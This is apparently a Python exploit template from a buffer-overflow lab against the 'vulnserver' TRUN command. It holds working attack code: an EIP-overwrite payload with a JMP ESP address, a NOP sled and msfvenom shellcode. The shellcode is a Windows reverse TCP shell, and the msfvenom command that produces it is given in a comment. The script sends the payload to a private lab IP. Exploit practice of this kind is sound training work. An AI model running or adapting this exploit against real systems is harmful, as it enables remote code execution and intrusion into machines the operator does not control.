#!/usr/bin/python

# This program is used to test whether or not you can overwrite EIP successfully.

import sys, socket

offset_output = 2003
# Replace this with offset output

return_address = "\xaf\x11\x50\x62"
# replace this with the JMP ESP of a vulnerable dll in LITTLE ENDIAN FORMAT (reverse of value from Immunity)

overflow = ("\xda\xcb\xba\xab\x24\xa5\x71\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x53\x17\x83\xeb\xfc\x03\xf8\x37\x47\x84\x02\xdf\x05"
"\x67\xfa\x20\x6a\xe1\x1f\x11\xaa\x95\x54\x02\x1a\xdd\x38\xaf"
"\xd1\xb3\xa8\x24\x97\x1b\xdf\x8d\x12\x7a\xee\x0e\x0e\xbe\x71"
"\x8d\x4d\x93\x51\xac\x9d\xe6\x90\xe9\xc0\x0b\xc0\xa2\x8f\xbe"
"\xf4\xc7\xda\x02\x7f\x9b\xcb\x02\x9c\x6c\xed\x23\x33\xe6\xb4"
"\xe3\xb2\x2b\xcd\xad\xac\x28\xe8\x64\x47\x9a\x86\x76\x81\xd2"
"\x67\xd4\xec\xda\x95\x24\x29\xdc\x45\x53\x43\x1e\xfb\x64\x90"
"\x5c\x27\xe0\x02\xc6\xac\x52\xee\xf6\x61\x04\x65\xf4\xce\x42"
"\x21\x19\xd0\x87\x5a\x25\x59\x26\x8c\xaf\x19\x0d\x08\xeb\xfa"
"\x2c\x09\x51\xac\x51\x49\x3a\x11\xf4\x02\xd7\x46\x85\x49\xb0"
"\xab\xa4\x71\x40\xa4\xbf\x02\x72\x6b\x14\x8c\x3e\xe4\xb2\x4b"
"\x40\xdf\x03\xc3\xbf\xe0\x73\xca\x7b\xb4\x23\x64\xad\xb5\xaf"
"\x74\x52\x60\x7f\x24\xfc\xdb\xc0\x94\xbc\x8b\xa8\xfe\x32\xf3"
"\xc9\x01\x99\x9c\x60\xf8\x4a\x63\xdc\x04\x08\x0b\x1f\x08\x1f"
"\x90\x96\xee\x75\x38\xff\xb9\xe1\xa1\x5a\x31\x93\x2e\x71\x3c"
"\x93\xa5\x76\xc1\x5a\x4e\xf2\xd1\x0b\xbe\x49\x8b\x9a\xc1\x67"
"\xa3\x41\x53\xec\x33\x0f\x48\xbb\x64\x58\xbe\xb2\xe0\x74\x99"
"\x6c\x16\x85\x7f\x56\x92\x52\xbc\x59\x1b\x16\xf8\x7d\x0b\xee"
"\x01\x3a\x7f\xbe\x57\x94\x29\x78\x0e\x56\x83\xd2\xfd\x30\x43"
"\xa2\xcd\x82\x15\xab\x1b\x75\xf9\x1a\xf2\xc0\x06\x92\x92\xc4"
"\x7f\xce\x02\x2a\xaa\x4a\x22\xc9\x7e\xa7\xcb\x54\xeb\x0a\x96"
"\x66\xc6\x49\xaf\xe4\xe2\x31\x54\xf4\x87\x34\x10\xb2\x74\x45"
"\x09\x57\x7a\xfa\x2a\x72")
# replace this with msfvenom output
# msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x... [badchars]"

nop_sled = "\x90" * 32

shellcode = "A" * offset_output + return_address + nop_sled + overflow



try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.6.144',9999)) 
    # Replace these with IP, port of vuln server

    s.send(('TRUN /.:/' + shellcode)) 
    # Look at immunity when it crashes to 
    # see if you need to change this part

    s.close()

except:
    print("Error connecting to server")
    sys.exit()